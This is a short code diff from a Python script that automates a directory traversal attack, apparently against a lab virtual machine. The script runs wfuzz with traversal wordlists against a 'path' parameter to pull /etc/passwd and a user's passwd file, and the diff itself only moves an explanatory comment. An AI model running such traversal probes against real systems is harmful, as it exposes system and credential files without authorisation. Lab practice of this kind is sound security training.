@@ -47,8 +47,6 @@ def dir_trav_attempt():
         print(f"For {path}:" + resp.text)
     print("\n>>Made 3 attemtps")
 
-# here he exploits the dir.trav vis wfuzz and gets /etc/passwd and /home/bob/passwd files
-
 
 def dir_traversal():
     """function that exploits directory traversal"""
@@ -56,6 +54,8 @@ def dir_traversal():
                       ("..//..//..//passwd", "dirTraversal.txt"), ]:
         print("\n>>Using WFUZZ util and trying to exploit directory traversal\n...")
         sleep(3)
+        # here he exploits the dir.trav vis wfuzz and gets 
+        #/etc/passwd and /home/bob/passwd files
         wfuzz = subprocess.Popen(
             ["wfuzz", "-c", "-z", "file," + dic,
              "--sc", "200", '192.168.56.102/action?path=FUZZ'],).communicate()
